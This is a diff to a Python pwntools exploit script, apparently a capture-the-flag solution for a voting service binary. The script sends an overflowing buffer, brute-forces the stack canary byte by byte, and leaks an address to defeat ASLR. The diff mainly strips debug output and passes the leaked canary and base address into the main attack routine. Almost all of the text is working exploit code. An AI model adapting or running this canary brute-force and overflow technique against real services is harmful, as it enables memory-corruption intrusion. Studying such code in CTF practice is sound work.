@@ -15,10 +15,6 @@ def vote():
     global cnt
     for do_vote in xrange(0, 10):
         r.sendlineafter('>', '1')
-        # Candidates:
-        # print(r.recvline())
-        # print(r.recvline())
-        # print(r.recv())
         r.sendlineafter('9]: ', '1')
 
         # Angelboy: Thank you!
@@ -39,11 +35,9 @@ def buf_canary():
     r.sendline('A' * 0xe8 + 'B' * 8)
 
     # Done!
-    print('Done: --> ', r.recv())
 
     # quit voting --> SIGABRT occurred
-    pause()
-    r.sendline('3')
+    r.sendlineafter('>', '3')
     print(r.recv())
 
 def hack_canary_ASLR():
@@ -65,9 +59,7 @@ def hack_canary_ASLR():
             r.sendthen('Token: ', buf + chr(guess))
 
             check = r.recvline()
-            # print('try canary --> ', hex(guess), check)
             if 'Invalid' not in check:
-                print('Correct canary byte --> ', format(guess, '02x'))
                 canary += chr(guess)
                 buf += chr(guess)
                 guess = 0
@@ -82,9 +74,7 @@ def hack_canary_ASLR():
     aslr = ''
     guess = 0
 
-    print('buf --> ', buf)
     print('canary --> ', hex(u64(canary)))
-    pause()
     while len(aslr) < 8:
         while guess <= 0xff:
 
@@ -92,9 +82,7 @@ def hack_canary_ASLR():
             r.sendthen('Token: ', buf + chr(guess))
 
             check = r.recvline()
-            # print('try canary --> ', hex(guess), check)
             if 'Invalid' not in check:
-                print('Correct aslr byte --> ', format(guess, '02x'))
                 aslr += chr(guess)
                 buf += chr(guess)
                 guess = 0
@@ -105,12 +93,13 @@ def hack_canary_ASLR():
 
             guess += 1
 
-    print('ASLR --> ', hex(u64(aslr)))
+    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
     return u64(canary), u64(aslr)
 
 def main():
     # brute force finding canary, and some ASLR-shit
-    hack_canary_ASLR()
+    canary, aslr = hack_canary_ASLR()
+
     # vote for writing more buffer
     for token_cnt in xrange(0, 25):
         r.sendlineafter('>', '2')
@@ -125,7 +114,7 @@ def main():
     r.sendlineafter('>', '1')
     r.sendlineafter('Token: ', token[26])
     r.sendlineafter('>', '1')
-    print(r.recv())
+    r.recv()
     print(r.recv())
     r.sendline('1')
     r.recvline()
